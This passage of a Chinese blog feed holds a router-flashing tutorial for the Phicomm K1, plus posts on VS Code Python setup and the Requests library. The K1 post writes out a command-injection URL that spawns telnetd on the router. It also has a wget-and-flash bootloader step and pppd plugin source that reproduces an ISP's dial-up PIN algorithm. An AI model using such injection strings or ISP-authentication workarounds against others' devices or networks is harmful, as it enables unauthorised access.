<p>240e:d:1000::ffff:1:<br>并在高级设置里面勾选默认网关</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-08.png" alt="op-08"></p>
<p>在防火墙设置里，把这个链接拉到wan口里</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-09.png" alt="op-09"></p>
<p>最后保存</p>
<p>这样，路由器上的设置就结束了，下面转入配置文件的修改上</p>
<p>依次顺序进入到如下路径</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-10.png" alt="op-10"></p>
<p>双击network文件打开</p>
<p>并在文件的位置更改</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-11.png" alt="op-11"></p>
<p>然后点击保存</p>
<p>然后进入到此目录，上传我们准备的E信算法库文件</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-12.png" alt="op-12"></p>
<p>最后重启一下路由器，同步一下路由器的时间，就可以了<br>注意，不同的芯片和不同地区的openwrt路由器，sxplugin.so文件是不一样的，具体请查看我上一篇文章打包的东西。</p>
<blockquote>
<p>再说一次，文章来源于群友，如有侵权，请联系我(aha971030@gmail.com)删除</p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 生活 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> life </tag>
            
            <tag> Hacker </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[给斐讯K1刷机并拨号e信(湖北地区测试无问题)]]></title>
      <url>http://akkuman.coding.me/2016/09/22/%E7%BB%99%E6%96%90%E8%AE%AFK1%E5%88%B7%E6%9C%BA%E5%B9%B6%E6%8B%A8%E5%8F%B7e%E4%BF%A1-%E6%B9%96%E5%8C%97%E5%9C%B0%E5%8C%BA%E6%B5%8B%E8%AF%95%E6%97%A0%E9%97%AE%E9%A2%98.html</url>
      <content type="html"><![CDATA[<h1 id="◆购买斐讯k1路由器"><a href="#◆购买斐讯k1路由器" class="headerlink" title="◆购买斐讯k1路由器"></a>◆购买斐讯k1路由器</h1><p>路由器在天猫京东斐讯旗舰店都有售卖，我买的价格是159，不过有一张铃铛卡，一个月之后返还160元，相当于0元购</p>
<h1 id="◆路由器刷不死Breed"><a href="#◆路由器刷不死Breed" class="headerlink" title="◆路由器刷不死Breed"></a>◆路由器刷不死Breed</h1><h2 id="1-路由与电脑有线连接好，输入192-168-2-1，完成设置"><a href="#1-路由与电脑有线连接好，输入192-168-2-1，完成设置" class="headerlink" title="1.路由与电脑有线连接好，输入192.168.2.1，完成设置"></a>1.路由与电脑有线连接好，输入192.168.2.1，完成设置</h2><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/k1basicSetting.png" alt="k1basicSetting"></p>
<h2 id="2-在浏览器地址栏输入：http-192-168-2-1-goform-Diagnosis-pingAddr-192-168-2-100-echo-quot-quot-telnetd"><a href="#2-在浏览器地址栏输入：http-192-168-2-1-goform-Diagnosis-pingAddr-192-168-2-100-echo-quot-quot-telnetd" class="headerlink" title="2.在浏览器地址栏输入：http://192.168.2.1/goform/Diagnosis?pingAddr=192.168.2.100|echo&quot;&quot;|telnetd"></a>2.在浏览器地址栏输入：<a href="http://192.168.2.1/goform/Diagnosis?pingAddr=192.168.2.100|echo&quot;&quot;|telnetd" target="_blank" rel="external">http://192.168.2.1/goform/Diagnosis?pingAddr=192.168.2.100|echo&quot;&quot;|telnetd</a></h2><p>(如果你的电脑ip不是192.168.2.100,请改成你电脑的ip(内网ip))</p>
<a id="more"></a>
<h2 id="3-打开tftp，这里用tftp32演示，按图设置"><a href="#3-打开tftp，这里用tftp32演示，按图设置" class="headerlink" title="3.打开tftp，这里用tftp32演示，按图设置"></a>3.打开tftp，这里用tftp32演示，按图设置</h2><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/tftpK1Setting.png" alt="tftpK1Setting"></p>
<h2 id="4-打开CMD-务必使用管理员权限，telnet-192-168-2-1"><a href="#4-打开CMD-务必使用管理员权限，telnet-192-168-2-1" class="headerlink" title="4.打开CMD,务必使用管理员权限，telnet 192.168.2.1"></a>4.打开CMD,务必使用管理员权限，telnet 192.168.2.1</h2><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/cmdK1Serting.png" alt="cmdK1Serting"></p>
<h2 id="5-输入用户名密码"><a href="#5-输入用户名密码" class="headerlink" title="5.输入用户名密码"></a>5.输入用户名密码</h2><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/cmd2K1Serting.png" alt="cmd2K1Serting"></p>
<h2 id="6-输入命令"><a href="#6-输入命令" class="headerlink" title="6.输入命令"></a>6.输入命令</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>) <span class="built_in">cd</span> /tmp</div><div class="line"></div><div class="line"><span class="number">2</span>) tftp –g –l /tmp/breed.bin –r breed.bin <span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span></div><div class="line"></div><div class="line"><span class="number">3</span>) cat /dev/mtd1 &gt;/tmp/mtd1.bin</div><div class="line">  cat /dev/mtd0 &gt;/tmp/mtd0.bin</div><div class="line"></div><div class="line"><span class="number">4</span>) tftp –p –r mtd1.bin –l /tmp/mtd1.bin <span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span></div><div class="line">  tftp –p –r mtd1.bin –l /tmp/mtd1.bin <span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span></div><div class="line"></div><div class="line"><span class="number">5</span>) mtd_write write breed.bin Bootloader</div></pre></td></tr></table></figure>
<p>等待出现#字<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/cmd3K1Serting.png" alt="cmd3K1Serting"></p>
<h2 id="7-拔掉电源，然后按住reset键插上电源，地址栏输入192-168-1-1，就进入了breed界面"><a href="#7-拔掉电源，然后按住reset键插上电源，地址栏输入192-168-1-1，就进入了breed界面" class="headerlink" title="7.拔掉电源，然后按住reset键插上电源，地址栏输入192.168.1.1，就进入了breed界面"></a>7.拔掉电源，然后按住reset键插上电源，地址栏输入192.168.1.1，就进入了breed界面</h2><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/K1breed.png" alt="K1breed"></p>
<h3 id="懒人一键式安装法："><a href="#懒人一键式安装法：" class="headerlink" title="懒人一键式安装法："></a>懒人一键式安装法：</h3><p>输入：<br>wget <a href="http://breed.hackpascal.net/breed-mt7620-reset1.bin" target="_blank" rel="external">http://breed.hackpascal.net/breed-mt7620-reset1.bin</a><br>然后输入：<br>mtd_write write breed-mt7620-reset1.bin Bootloader</p>
<p>等待出现#字（代表着已经完成）</p>
<h2 id="刷breed后语"><a href="#刷breed后语" class="headerlink" title="刷breed后语"></a>刷breed后语</h2><p>只要路由breed不被变动，路由刷错固件也不怕，同样方式进入breed刷回正确的即可。</p>
<p>推荐每次刷完固件后，去固件系统管理–恢复原厂默认值。</p>
<h1 id="◆刷openWRT"><a href="#◆刷openWRT" class="headerlink" title="◆刷openWRT"></a>◆刷openWRT</h1><h2 id="1-刷新固件"><a href="#1-刷新固件" class="headerlink" title="1.刷新固件"></a>1.刷新固件</h2><p>我在下面的文件中打包了两个固件，一个是潘多拉的K1专版，一个是openWRT，我自己使用的是专版潘多拉，各位看官自己选择，刷新固件很简单，看图<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/K1breedset1.png" alt="set1"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/K1breedset2.png" alt="set2"></p>
<p>点击更新，看路由灯全部亮起后，无线网络出现,OK</p>
<h1 id="◆安装e信-NetKeeper-插件并进行拨号"><a href="#◆安装e信-NetKeeper-插件并进行拨号" class="headerlink" title="◆安装e信(NetKeeper)插件并进行拨号"></a>◆安装e信(NetKeeper)插件并进行拨号</h1><h2 id="1-你得准备一些东西-WINSCP一个，op系统相关netkeeper一只）找到对应地区更改文件名为sxplugin-so"><a href="#1-你得准备一些东西-WINSCP一个，op系统相关netkeeper一只）找到对应地区更改文件名为sxplugin-so" class="headerlink" title="1.你得准备一些东西(WINSCP一个，op系统相关netkeeper一只）找到对应地区更改文件名为sxplugin.so"></a>1.你得准备一些东西(WINSCP一个，op系统相关netkeeper一只）找到对应地区更改文件名为<code>sxplugin.so</code></h2><h2 id="2-通过WINSCP登录你的路由器"><a href="#2-通过WINSCP登录你的路由器" class="headerlink" title="2.通过WINSCP登录你的路由器"></a>2.通过WINSCP登录你的路由器</h2><p><strong> 注意使用scp协议，密码admin（第一次登录op需要重设密码依然设为admin就可以了 </strong></p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/winscpK1set.png" alt="winscpK1set"></p>
<h2 id="3-放入拨号插件"><a href="#3-放入拨号插件" class="headerlink" title="3.放入拨号插件"></a>3.放入拨号插件</h2><p>登录之后打开路由器，在这儿选择/(root）然后选择/usr/lib/pppd/2.4.7文件夹将你编辑好的<code>sxplugin.so</code>文件放入即可（<strong> 这里的sxplugin.so是自己更名的，湖北的就选择wuhan的来更名，文件在文末有打包 </strong> ）</p>
<h2 id="4-设置帐号密码拨号"><a href="#4-设置帐号密码拨号" class="headerlink" title="4.设置帐号密码拨号"></a>4.设置帐号密码拨号</h2><p>通过浏览器登录浏览器打开网络下的接口选择WAN口点击修改，协议选择PPPOE即可，然后下面有个按钮点一下会出来填帐号密码的，账户和密码也要写对，我是重庆动态密码可以正常用。（蓝字我是加了中文包的，你刷了过后是英文呢，凑合看吧，加中文包需要路由器联网。）</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/openWRTK1.png" alt="op"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/openWRTK1wan.png" alt="op2"></p>
<p>最后点击保存应用退出</p>
<h2 id="5-最后的配置"><a href="#5-最后的配置" class="headerlink" title="5.最后的配置"></a>5.最后的配置</h2><p>通过WINSCP登录路由器同样打开文件夹/etc/config/找到network修改<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/K1network.png" alt="K1network"></p>
<p>在图中的位置输入option ‘pppd_options’ ‘plugin sxplugin.so’这个代码即可（注意粘贴后字体是否一致，主要是‘号的问题，可保存后再打开查看，必须搞定字体格式才行），到此netkeeper就安装完了。最后重启路由器，到系统里面选时区，同步浏览器时间，保存。再到wan点击连接就能联网了。（如果进不去wan这个界面就是设置错了）</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/k1lastsetting.png" alt="k1lastsetting"></p>
<blockquote>
<p>最后要说的，这个可用的原因是湖北地区e信2.5的算法依旧可用，有的地区加了心跳，有的地区强制升级了，并不可用,教程到此处完结，后面的有能力可以看看，工具教程打包在文末</p>
</blockquote>
<h1 id="◆闪讯算法源码"><a href="#◆闪讯算法源码" class="headerlink" title="◆闪讯算法源码"></a>◆闪讯算法源码</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pppd/pppd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pppd/md5.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> byte;</div><div class="line"></div><div class="line"><span class="keyword">char</span> pppd_version[] = VERSION;</div><div class="line"></div><div class="line"><span class="keyword">static</span> <span class="keyword">char</span> saveuser[MAXNAMELEN] = &#123;<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">static</span> <span class="keyword">char</span> savepwd[MAXSECRETLEN] = &#123;<span class="number">0</span>&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getPIN</span><span class="params">(byte *userName, byte *PIN)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i,j;<span class="comment">//循环变量</span></div><div class="line">    <span class="keyword">long</span> timedivbyfive;<span class="comment">//时间除以五</span></div><div class="line">    <span class="keyword">time_t</span> timenow;<span class="comment">//当前时间，从time()获得</span></div><div class="line">    byte RADIUS[<span class="number">16</span>];<span class="comment">//凑位字符</span></div><div class="line">    byte timeByte[<span class="number">4</span>];<span class="comment">//时间 div 5</span></div><div class="line">    byte beforeMD5[<span class="number">32</span>];<span class="comment">//时间 div 5+用户名+凑位</span></div><div class="line">    MD5_CTX md5;<span class="comment">//MD5结构体</span></div><div class="line">    byte afterMD5[<span class="number">16</span>];<span class="comment">//MD5输出</span></div><div class="line">    byte MD501H[<span class="number">2</span>]; <span class="comment">//MD5前两位</span></div><div class="line">    byte MD501[<span class="number">3</span>];</div><div class="line">    byte timeHash[<span class="number">4</span>]; <span class="comment">//时间div5经过第一次转后后的值</span></div><div class="line">    byte temp[<span class="number">32</span>]; <span class="comment">//第一次转换时所用的临时数组</span></div><div class="line">    byte PIN27[<span class="number">6</span>]; <span class="comment">//PIN的2到7位，由系统时间转换</span></div><div class="line"></div><div class="line">    <span class="comment">//code</span></div><div class="line">    info(<span class="string">"sxplugin : using zjxinlisx01"</span>);</div><div class="line">    <span class="built_in">strcpy</span>(RADIUS, <span class="string">"zjxinlisx01"</span>);</div><div class="line">    timenow = time(<span class="literal">NULL</span>);</div><div class="line">    timedivbyfive = timenow / <span class="number">5</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</div><div class="line">        timeByte[i] = (byte)(timedivbyfive &gt;&gt; (<span class="number">8</span> * (<span class="number">3</span> - i)) &amp; <span class="number">0xFF</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</div><div class="line">        beforeMD5[i]= timeByte[i];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span>(i = <span class="number">4</span>; i &lt; <span class="number">16</span> &amp;&amp; userName[i<span class="number">-4</span>]!=<span class="string">'@'</span> ; i++) &#123;</div><div class="line">        beforeMD5[i] = userName[i<span class="number">-4</span>];</div><div class="line">    &#125;</div><div class="line">    j=<span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span>(RADIUS[j]!=<span class="string">'\0'</span>)</div><div class="line">        beforeMD5[i++] = RADIUS[j++];</div><div class="line"></div><div class="line">    MD5_Init(&amp;md5);</div><div class="line">    MD5_Update (&amp;md5, beforeMD5, i);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d %s\n"</span>,i,beforeMD5);</div><div class="line">    MD5_Final (afterMD5, &amp;md5);</div><div class="line"></div><div class="line">    MD501H[<span class="number">0</span>] = afterMD5[<span class="number">0</span>] &gt;&gt; <span class="number">4</span> &amp; <span class="number">0xF</span>;</div><div class="line">    MD501H[<span class="number">1</span>] = afterMD5[<span class="number">0</span>] &amp; <span class="number">0xF</span>;</div><div class="line"></div><div class="line">    <span class="built_in">sprintf</span>(MD501,<span class="string">"%x%x"</span>,MD501H[<span class="number">0</span>],MD501H[<span class="number">1</span>]);</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</div><div class="line">        temp[i] = timeByte[(<span class="number">31</span> - i) / <span class="number">8</span>] &amp; <span class="number">1</span>;</div><div class="line">        timeByte[(<span class="number">31</span> - i) / <span class="number">8</span>] = timeByte[(<span class="number">31</span> - i) / <span class="number">8</span>] &gt;&gt; <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</div><div class="line">        timeHash[i] = temp[i] * <span class="number">128</span> + temp[<span class="number">4</span> + i] * <span class="number">64</span> + temp[<span class="number">8</span> + i]</div><div class="line">            * <span class="number">32</span> + temp[<span class="number">12</span> + i] * <span class="number">16</span> + temp[<span class="number">16</span> + i] * <span class="number">8</span> + temp[<span class="number">20</span> + i]</div><div class="line">            * <span class="number">4</span> + temp[<span class="number">24</span> + i] * <span class="number">2</span> + temp[<span class="number">28</span> + i];</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    temp[<span class="number">1</span>] = (timeHash[<span class="number">0</span>] &amp; <span class="number">3</span>) &lt;&lt; <span class="number">4</span>;</div><div class="line">    temp[<span class="number">0</span>] = (timeHash[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>;</div><div class="line">    temp[<span class="number">2</span>] = (timeHash[<span class="number">1</span>] &amp; <span class="number">0xF</span>) &lt;&lt; <span class="number">2</span>;</div><div class="line">    temp[<span class="number">1</span>] = (timeHash[<span class="number">1</span>] &gt;&gt; <span class="number">4</span> &amp; <span class="number">0xF</span>) + temp[<span class="number">1</span>];</div><div class="line">    temp[<span class="number">3</span>] = timeHash[<span class="number">2</span>] &amp; <span class="number">0x3F</span>;</div><div class="line">    temp[<span class="number">2</span>] = ((timeHash[<span class="number">2</span>] &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3</span>) + temp[<span class="number">2</span>];</div><div class="line">    temp[<span class="number">5</span>] = (timeHash[<span class="number">3</span>] &amp; <span class="number">3</span>) &lt;&lt; <span class="number">4</span>;</div><div class="line">    temp[<span class="number">4</span>] = (timeHash[<span class="number">3</span>] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</div><div class="line">        PIN27[i] = temp[i] + <span class="number">0x020</span>;</div><div class="line">        <span class="keyword">if</span>(PIN27[i]&gt;=<span class="number">0x40</span>) &#123;</div><div class="line">            PIN27[i]++;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    PIN[<span class="number">0</span>] = <span class="string">'\r'</span>;</div><div class="line">    PIN[<span class="number">1</span>] = <span class="string">'\n'</span>;</div><div class="line"></div><div class="line">    <span class="built_in">memcpy</span>(PIN+<span class="number">2</span>, PIN27, <span class="number">6</span>);</div><div class="line"></div><div class="line">    PIN[<span class="number">8</span>] = MD501[<span class="number">0</span>];</div><div class="line">    PIN[<span class="number">9</span>] = MD501[<span class="number">1</span>];</div><div class="line"></div><div class="line">    <span class="built_in">strcpy</span>(PIN+<span class="number">10</span>, userName);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pap_modifyusername</span><span class="params">(<span class="keyword">char</span> *user, <span class="keyword">char</span>* passwd)</span></span></div><div class="line">&#123;</div><div class="line">    byte PIN[MAXSECRETLEN] = &#123;<span class="number">0</span>&#125;;</div><div class="line">    getPIN(saveuser, PIN);</div><div class="line">    <span class="built_in">strcpy</span>(user, PIN);</div><div class="line">    info(<span class="string">"sxplugin : user  is %s "</span>,user);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">plugin_init</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">    info(<span class="string">"sxplugin : init"</span>);</div><div class="line">    <span class="built_in">strcpy</span>(saveuser,user);</div><div class="line">    <span class="built_in">strcpy</span>(savepwd,passwd);</div><div class="line">    pap_modifyusername(user, saveuser);</div><div class="line">    info(<span class="string">"sxplugin : passwd loaded"</span>);</div><div class="line">    pap_check_hook=check;</div><div class="line">    chap_check_hook=check;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="◆下载地址"><a href="#◆下载地址" class="headerlink" title="◆下载地址"></a>◆下载地址</h1><p><a href="http://cloud.189.cn/t/umuUBrQNNRfi" target="_blank" rel="external">  (访问码:4854)</a></p>
]]></content>
      
        <categories>
            
            <category> 生活 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> life </tag>
            
            <tag> Hacker </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Visual Studio Code配置Python开发环境]]></title>
      <url>http://akkuman.coding.me/2016/06/29/Visual-Studio-Code%E9%85%8D%E7%BD%AEPython%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83.html</url>
      <content type="html"><![CDATA[<h1 id="1-安装Python插件"><a href="#1-安装Python插件" class="headerlink" title="1.安装Python插件"></a>1.安装Python插件</h1><p>在VScode界面按<code>Crtl</code>+<code>Shift</code>+<code>P</code>或者<code>F1</code></p>
<p>输入<code>ext install</code></p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/ext%20install.png" alt="ext install"></p>
<p>直接安装<code>Python</code>，也就是点击它，然后等待，安装好后会提示你重启<br><a id="more"></a></p>
<h1 id="2-配置运行Python程序"><a href="#2-配置运行Python程序" class="headerlink" title="2.配置运行Python程序"></a>2.配置运行Python程序</h1><p>同样的打开命令面板（<code>Crtl</code>+<code>Shift</code>+<code>P</code>或<code>F1</code>），然后输入<code>Tasks: Configure Task Runner</code>（中文输入：任务，然后选择任务：配置任务运行程序），选择<code>Other</code></p>
<p>此时VScode会自动生成.vscode文件夹并生成一个默认的task.json</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/vscode-tasks.json.png" alt="tasks.json"></p>
<p>配置如下</p>
<pre><code>&quot;version&quot;: &quot;0.1.0&quot;,
&quot;command&quot;: &quot;python&quot;,
&quot;isShellCommand&quot;: true,
&quot;args&quot;: [&quot;${file}&quot;],
&quot;showOutput&quot;: &quot;always&quot;
</code></pre><p>然后写完代码后<br><code>Crtl</code>+<code>Shift</code>+<code>B</code>运行Py程序<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/VScode-python-run.png" alt="python-run"></p>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
            <tag> VSCode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python之Requests的高级用法]]></title>
      <url>http://akkuman.coding.me/2016/06/10/Python%E4%B9%8BRequests%E7%9A%84%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95.html</url>
      <content type="html"><![CDATA[<hr>
<h1 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h1><hr>
<p>本篇文档涵盖了Requests的一些更加高级的特性。</p>
<hr>
<h2 id="会话对象"><a href="#会话对象" class="headerlink" title="会话对象"></a>会话对象</h2><hr>
<p>会话对象让你能够跨请求保持某些参数。它也会在同一个Session实例发出的所有请求之间保持cookies。</p>
<p>会话对象具有主要的Requests API的所有方法。</p>
<p>我们来跨请求保持一些cookies:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">s = requests.Session()</div><div class="line"></div><div class="line">s.get(<span class="string">'http://httpbin.org/cookies/set/sessioncookie/123456789'</span>)</div><div class="line">r = s.get(<span class="string">"http://httpbin.org/cookies"</span>)</div><div class="line"></div><div class="line">print(r.text)</div><div class="line"><span class="comment"># '&#123;"cookies": &#123;"sessioncookie": "123456789"&#125;&#125;'</span></div></pre></td></tr></table></figure>
<a id="more"></a>
<p>会话也可用来为请求方法提供缺省数据。这是通过为会话对象的属性提供数据来实现的:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">s = requests.Session()</div><div class="line">s.auth = (<span class="string">'user'</span>, <span class="string">'pass'</span>)</div><div class="line">s.headers.update(&#123;<span class="string">'x-test'</span>: <span class="string">'true'</span>&#125;)</div><div class="line"></div><div class="line"><span class="comment"># both 'x-test' and 'x-test2' are sent</span></div><div class="line">s.get(<span class="string">'http://httpbin.org/headers'</span>, headers=&#123;<span class="string">'x-test2'</span>: <span class="string">'true'</span>&#125;)</div></pre></td></tr></table></figure>
<p>任何你传递给请求方法的字典都会与已设置会话层数据合并。方法层的参数覆盖会话的参数。</p>
<blockquote>
<p><strong>从字典参数中移除一个值</strong><br>有时你会想省略字典参数中一些会话层的键。要做到这一点，你只需简单地在方法层参数中将那个键的值设置为 None ，那个键就会被自动省略掉。</p>
</blockquote>
<p>包含在一个会话中的所有数据你都可以直接使用。学习更多细节请阅读 <a href="http://cn.python-requests.org/zh_CN/latest/api.html#sessionapi" target="_blank" rel="external">会话API文档</a> 。</p>
<hr>
<h2 id="请求与响应对象"><a href="#请求与响应对象" class="headerlink" title="请求与响应对象"></a>请求与响应对象</h2><hr>
<p>任何时候调用requests.*()你都在做两件主要的事情。其一，你在构建一个 Request 对象， 该对象将被发送到某个服务器请求或查询一些资源。其二，一旦 requests 得到一个从 服务器返回的响应就会产生一个 Response 对象。该响应对象包含服务器返回的所有信息， 也包含你原来创建的 Request 对象。如下是一个简单的请求，从Wikipedia的服务器得到 一些非常重要的信息:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://en.wikipedia.org/wiki/Monty_Python'</span>)</div></pre></td></tr></table></figure>
<p>如果想访问服务器返回给我们的响应头部信息，可以这样做:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; r.headers</div><div class="line">&#123;'content-length': '56170', 'x-content-type-options': 'nosniff', 'x-cache':</div><div class="line">'HIT from cp1006.eqiad.wmnet, MISS from cp1010.eqiad.wmnet', 'content-encoding':</div><div class="line">'gzip', 'age': '3080', 'content-language': 'en', 'vary': 'Accept-Encoding,Cookie',</div><div class="line">'server': 'Apache', 'last-modified': 'Wed, 13 Jun 2012 01:33:50 GMT',</div><div class="line">'connection': 'close', 'cache-control': 'private, s-maxage=0, max-age=0,</div><div class="line">must-revalidate', 'date': 'Thu, 14 Jun 2012 12:59:39 GMT', 'content-type':</div><div class="line">'text/html; charset=UTF-8', 'x-cache-lookup': 'HIT from cp1006.eqiad.wmnet:3128,</div><div class="line">MISS from cp1010.eqiad.wmnet:80'&#125;</div></pre></td></tr></table></figure>
<p>然而，如果想得到发送到服务器的请求的头部，我们可以简单地访问该请求，然后是该请求的头部:</p>
